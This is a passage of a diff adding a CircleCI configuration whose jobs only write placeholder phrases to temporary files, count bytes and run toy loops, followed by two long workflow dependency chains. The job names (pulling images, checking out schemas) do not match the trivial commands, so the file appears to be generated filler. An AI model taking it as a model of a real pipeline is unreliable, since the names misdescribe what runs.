+            arr=(wrench iodine ochre); printf '%s\n' "${arr[@]}" | wc -l
+            j=0; while [[ "$j" != 5 ]]; do ((j += 1)); printf 'stage %d\n' "$j"; done; echo "all steps complete"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'nightly-deployment'
+  StripImporterBinaries:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: branch-checkout-task
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            printf 'review-run adapter-test-logs-slot-3\n' > /tmp/update-agent-sources/validate-license-headers
+            wc -c < /tmp/update-agent-sources/validate-license-headers
+            for z in 1 2; do for c in red blue; do echo "$z-$c"; done; done; echo checks complete
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'validate-license-headers'
+  import-notification-service-environment-settings-on-failure:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Post-backup state restore
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            touch /tmp/update-agent-sources/conditional-release-build-hook && echo 'startup-benchmark-node-6 linking-binaries' > /tmp/update-agent-sources/conditional-release-build-hook
+            wc -c < /tmp/update-agent-sources/conditional-release-build-hook
+            printf '%s\n' hammer hawk gear | grep -w gear
+            k=0; while [ "$k" -ne 4 ]; do k=$((k+1)); echo "part $k of 4"; done; echo "finished"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'conditional-release-build-hook'
+  save-coverage-summary-with-timeout:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: resolve-link-checker-runtime-dependencies-split-2
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'listing-skipped-tests store-distribution-iteration-4' > /tmp/update-agent-sources/collect-mailer-lint-results
+            wc -c < /tmp/update-agent-sources/collect-mailer-lint-results
+            echo "gold walnut crab" | xargs -n 1
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'collect-mailer-lint-results'
+  PullCoreImageFromUpstream:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Check out billing service schemas with retries
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            ( echo 'rerunning-policy-checks low-priority-monitoring' ) > /tmp/update-agent-sources/compress-and-store-package
+            wc -c < /tmp/update-agent-sources/compress-and-store-package
+            n=34; u=0; while ((n != 1)); do if ((n % 2 == 0)); then n=$((n / 2)); else n=$((3 * n + 1)); fi; u=$((u + 1)); done; echo "answer $u"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'compress-and-store-package'
+workflows:
+  BridgeDependencyTree:
+    jobs:
+      - monitor-instances-with-extended-timeout
+      - bridge-validation-segment-5-of-8:
+          requires:
+            - monitor-instances-with-extended-timeout
+      - PreSyncVulnerabilityScan:
+          requires:
+            - monitor-instances-with-extended-timeout
+      - debugger-checksums:
+          requires:
+            - PreSyncVulnerabilityScan
+      - approving-driver-release-in-dry-run-mode:
+          requires:
+            - PreSyncVulnerabilityScan
+      - UserPortalVersion:
+          requires:
+            - approving-driver-release-in-dry-run-mode
+      - analyze-mobile-app:
+          requires:
+            - approving-driver-release-in-dry-run-mode
+      - release-source-archive-to-beta-testers:
+          requires:
+            - analyze-mobile-app
+      - promote-test-build-and-notify-maintainers:
+          requires:
+            - analyze-mobile-app
+      - plugin-build-number:
+          requires:
+            - promote-test-build-and-notify-maintainers
+      - verify-and-deploy-examples:
+          requires:
+            - promote-test-build-and-notify-maintainers
+      - RunBuildScriptWithTimeout:
+          requires:
+            - verify-and-deploy-examples
+      - one-time-update:
+          requires:
+            - verify-and-deploy-examples
+      - post-sync-data-migration:
+          requires:
+            - one-time-update
+      - performance-benchmark-pipeline:
+          requires:
+            - one-time-update
+      - binary-rebuild-job-9:
+          requires:
+            - performance-benchmark-pipeline
+      - LoadMetricsExporterDatabaseFromRemoteCache:
+          requires:
+            - performance-benchmark-pipeline
+      - ScaleReviewEnvironmentWithRetries:
+          requires:
+            - LoadMetricsExporterDatabaseFromRemoteCache
+      - cache-pipeline:
+          requires:
+            - LoadMetricsExporterDatabaseFromRemoteCache
+      - enable-experimental-features-before-build:
+          requires:
+            - cache-pipeline
+      - check-lock-file:
+          requires:
+            - cache-pipeline
+      - ImportCertificatesAndSignBinary:
+          requires:
+            - check-lock-file
+      - PartialTest:
+          requires:
+            - check-lock-file
+      - tracking-response-time:
+          requires:
+            - PartialTest
+      - status-page-smoke-tests:
+          requires:
+            - PartialTest
+      - MinimalBundleChecksum:
+          requires:
+            - status-page-smoke-tests
+      - post-checkout-backup:
+          requires:
+            - status-page-smoke-tests
+      - measure-cold-start-time-on-dedicated-runners:
+          requires:
+            - post-checkout-backup
+      - pre-merge-extension-build:
+          requires:
+            - post-checkout-backup
+      - Compress:
+          requires:
+            - pre-merge-extension-build
+      - pre-sync-system-tests:
+          requires:
+            - pre-merge-extension-build
+      - settings-loader-release:
+          requires:
+            - pre-sync-system-tests
+      - firmware-build-summary:
+          requires:
+            - pre-sync-system-tests
+      - settings-loader-code-review:
+          requires:
+            - firmware-build-summary
+      - PrepareWorkingDirectory:
+          requires:
+            - firmware-build-summary
+      - Enabling:
+          requires:
+            - PrepareWorkingDirectory
+      - download-package-and-verify-hashes:
+          requires:
+            - PrepareWorkingDirectory
+      - verifying-job-9-of-9:
+          requires:
+            - download-package-and-verify-hashes
+  completeReleaseGate:
+    jobs:
+      - pre-tag-database-deployment-tier-3
+      - pre-launch-dependency-update:
+          requires:
+            - pre-tag-database-deployment-tier-3
+      - CopyBenchmarkResultsOverSecureConnection:
+          requires:
+            - pre-launch-dependency-update
+      - BillingBenchmarkComparisonTaskWorker4:
+          requires:
+            - pre-launch-dependency-update
+      - post-upload-actions:
+          requires:
+            - BillingBenchmarkComparisonTaskWorker4
+      - stamp-search-version-string:
+          requires:
+            - post-upload-actions
+      - MigrateWorkerDatabaseSchemaPart1Of2:
+          requires:
+            - post-upload-actions
+      - full-bump:
+          requires:
+            - MigrateWorkerDatabaseSchemaPart1Of2
+      - mobile-app-lint-results:
+          requires:
+            - full-bump
+      - watching-canary-release:
+          requires:
+            - full-bump
+      - SettingUpSandboxEnvironment:
+          requires:
+            - watching-canary-release
+      - PostRollbackChecks:
+          requires:
+            - SettingUpSandboxEnvironment
+      - CompileDispatcher:
+          requires:
+            - SettingUpSandboxEnvironment
+      - LoggerReview:
+          requires:
+            - CompileDispatcher
+      - ResolverTutorials:
+          requires:
+            - LoggerReview
+      - PrimaryEdgeProxyUpgradeDryRun:
+          requires:
+            - LoggerReview
+      - WriteRateLimiterBuildManifest:
+          requires:
+            - PrimaryEdgeProxyUpgradeDryRun
+      - source-fetch-wave-3:
+          requires:
+            - WriteRateLimiterBuildManifest
+      - logging-changed-files:
+          requires:
+            - WriteRateLimiterBuildManifest
+      - detect-changed-packages-with-strict-rules:
+          requires:
+            - logging-changed-files
+      - pre-build-deployment-health-check:
+          requires:
+            - detect-changed-packages-with-strict-rules
+      - clone-test-harness-release-branch:
+          requires:
+            - detect-changed-packages-with-strict-rules
+      - StripImporterBinaries:
+          requires:
+            - clone-test-harness-release-branch
+      - compress-bundle:
+          requires:
+            - StripImporterBinaries
+      - LicenseReview:
+          requires:
+            - StripImporterBinaries
+      - import-notification-service-environment-settings-on-failure:
+          requires:
+            - LicenseReview
+      - CopyAdapterBinariesToPackageRegistry:
+          requires:
+            - import-notification-service-environment-settings-on-failure
+      - SequentialBuildDigestStage:
+          requires:
+            - import-notification-service-environment-settings-on-failure
+      - save-coverage-summary-with-timeout:
+          requires:
+            - SequentialBuildDigestStage
+      - Reclaim:
+          requires:
+            - save-coverage-summary-with-timeout
+      - start-dependent-services:
+          requires:
+            - save-coverage-summary-with-timeout
+      - PullCoreImageFromUpstream:
+          requires:
+            - start-dependent-services
+      - ConfigurationSyncBatch11:
+          requires:
+            - PullCoreImageFromUpstream
